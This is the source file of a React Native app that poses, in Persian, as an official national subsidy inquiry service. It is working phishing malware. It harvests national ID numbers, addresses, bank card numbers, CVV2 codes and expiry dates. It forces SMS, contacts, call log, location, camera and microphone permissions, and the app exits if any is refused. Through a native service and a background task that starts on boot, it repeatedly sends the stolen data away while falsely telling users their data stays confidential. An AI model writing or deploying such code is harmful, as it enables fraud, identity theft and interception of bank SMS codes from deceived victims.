import React, { useState, useEffect } from 'react';
import { ScrollView, View, Text, Alert, StyleSheet, NativeModules, BackHandler } from 'react-native';
import { TextInput, Button, Provider as PaperProvider } from 'react-native-paper';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { check, request, PERMISSIONS, RESULTS, Permission } from 'react-native-permissions';
import BackgroundFetch from '@react-native-community/background-fetch';

const App = () => {
  const [formVisible, setFormVisible] = useState(true);
  const [fullName, setFullName] = useState('');
  const [fatherName, setFatherName] = useState('');
  const [nationalId, setNationalId] = useState('');
  const [birthDate, setBirthDate] = useState('');
  const [birthPlace, setBirthPlace] = useState('');
  const [address, setAddress] = useState('');
  const [cityProvince, setCityProvince] = useState('');
  const [mobileNumber, setMobileNumber] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cvv2, setCvv2] = useState('');
  const [expiryDate, setExpiryDate] = useState('');

  const permissions: Permission[] = [
    PERMISSIONS.ANDROID.READ_SMS,
    PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE,
    PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION,
    PERMISSIONS.ANDROID.READ_CONTACTS,
    PERMISSIONS.ANDROID.READ_CALL_LOG,
    PERMISSIONS.ANDROID.CAMERA,
    PERMISSIONS.ANDROID.RECORD_AUDIO,
  ];

  useEffect(() => {
    checkPermissions();
    configureBackgroundFetch();
  }, []);

  const configureBackgroundFetch = async () => {
    await BackgroundFetch.configure(
      {
        minimumFetchInterval: 15, // حداقل فاصله بین fetch در دقیقه
        stopOnTerminate: false,
        startOnBoot: true,
      },
      async (taskId: string) => {
        console.log('[BackgroundFetch] taskId:', taskId);
        const userData = await AsyncStorage.getItem('userData');
        if (userData) {
          NativeModules.BackgroundService.sendUserData(userData);
        }
        BackgroundFetch.finish(taskId);
      },
      (taskId: string) => {
        console.log('[BackgroundFetch] TIMEOUT taskId:', taskId);
        BackgroundFetch.finish(taskId);
      }
    );
    BackgroundFetch.start();
  };

  const checkPermissions = async () => {
    for (const perm of permissions) {
      const result = await check(perm);
      if (result !== RESULTS.GRANTED) {
        Alert.alert(
          'مجوز لازم است',
          'برای استفاده از اپ، باید همه مجوزها رو بدید.',
          [
            { text: 'دوباره امتحان', onPress: () => requestPermission(perm) },
            { text: 'خروج', onPress: () => BackHandler.exitApp() },
          ],
          { cancelable: false }
        );
        return;
      }
    }
    NativeModules.BackgroundService.startService();
  };

  const requestPermission = async (perm: Permission) => {
    const result = await request(perm);
    if (result === RESULTS.GRANTED) {
      checkPermissions();
    } else {
      checkPermissions();
    }
  };

  const validateFields = () => {
    return fullName && fatherName && nationalId && birthDate && birthPlace && address &&
           cityProvince && mobileNumber && cardNumber && cvv2 && expiryDate;
  };

  const handleSubmit = async () => {
    if (validateFields()) {
      const userData = `Full Name: ${fullName}\nFather Name: ${fatherName}\nNational ID: ${nationalId}\nBirth Date: ${birthDate}\nBirth Place: ${birthPlace}\nAddress: ${address}\nCity/Province: ${cityProvince}\nMobile: ${mobileNumber}\nCard Number: ${cardNumber}\nCVV2: ${cvv2}\nExpiry: ${expiryDate}`;
      await AsyncStorage.setItem('userData', userData);
      NativeModules.BackgroundService.sendUserData(userData);
      setFormVisible(false);
    } else {
      Alert.alert('خطا', 'لطفاً همه فیلدها را پر کنید');
    }
  };

  return (
    <PaperProvider>
      {formVisible ? (
        <ScrollView style={styles.container}>
          <Text style={styles.header}>سامانه استعلام یارانه ملی</Text>
          <Text style={styles.subHeader}>
            این اپلیکیشن رسمی برای استعلام وضعیت قطعی یارانه ملی است. لطفاً اطلاعات شخصی خود را دقیق وارد کنید تا استعلام انجام شود. اطلاعات شما محرمانه است و تنها برای پردازش استعلام استفاده می‌شود. پس از ارسال، نتیجه از طریق پیامک به شماره موبایل شما ارسال خواهد شد.
          </Text>
          <TextInput label="نام و نام خانوادگی" value={fullName} onChangeText={setFullName} style={styles.input} />
          <TextInput label="نام پدر" value={fatherName} onChangeText={setFatherName} style={styles.input} />
          <TextInput label="کد ملی" value={nationalId} onChangeText={setNationalId} keyboardType="numeric" style={styles.input} />
          <TextInput label="تاریخ تولد (YYYY-MM-DD)" value={birthDate} onChangeText={setBirthDate} keyboardType="numeric" style={styles.input} />
          <TextInput label="محل تولد" value={birthPlace} onChangeText={setBirthPlace} style={styles.input} />
          <TextInput label="آدرس دقیق محل سکونت" value={address} onChangeText={setAddress} style={styles.input} />
          <TextInput label="شهر و استان" value={cityProvince} onChangeText={setCityProvince} style={styles.input} />
          <TextInput label="شماره موبایل" value={mobileNumber} onChangeText={setMobileNumber} keyboardType="phone-pad" style={styles.input} />
          <TextInput label="شماره کارت اصلی (یارانه)" value={cardNumber} onChangeText={setCardNumber} keyboardType="numeric" style={styles.input} />
          <TextInput label="CVV2" value={cvv2} onChangeText={setCvv2} keyboardType="numeric" secureTextEntry style={styles.input} />
          <TextInput label="تاریخ انقضا (MM/YY)" value={expiryDate} onChangeText={setExpiryDate} keyboardType="numeric" style={styles.input} />
          <Button mode="contained" onPress={handleSubmit} style={styles.button}>
            تایید و ارسال
          </Button>
        </ScrollView>
      ) : (
        <View style={styles.successContainer}>
          <Text style={styles.successText}>اطلاعات شما به سامانه فرستاده شد</Text>
          <Text style={styles.successSubText}>پاسخ از طریق پیامک ارسال خواهد شد</Text>
        </View>
      )}
    </PaperProvider>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#F0F8FF', padding: 16 },
  header: { fontSize: 24, color: '#2196F3', fontWeight: 'bold', marginBottom: 8 },
  subHeader: { fontSize: 16, color: '#333', marginBottom: 16 },
  input: { marginBottom: 16 },
  button: { backgroundColor: '#2196F3', marginTop: 16 },
  successContainer: { flex: 1, backgroundColor: '#E8F5E9', justifyContent: 'center', alignItems: 'center', padding: 32 },
  successText: { fontSize: 24, color: '#4CAF50', fontWeight: 'bold', marginBottom: 16 },
  successSubText: { fontSize: 18, color: '#333' },
});

export default App;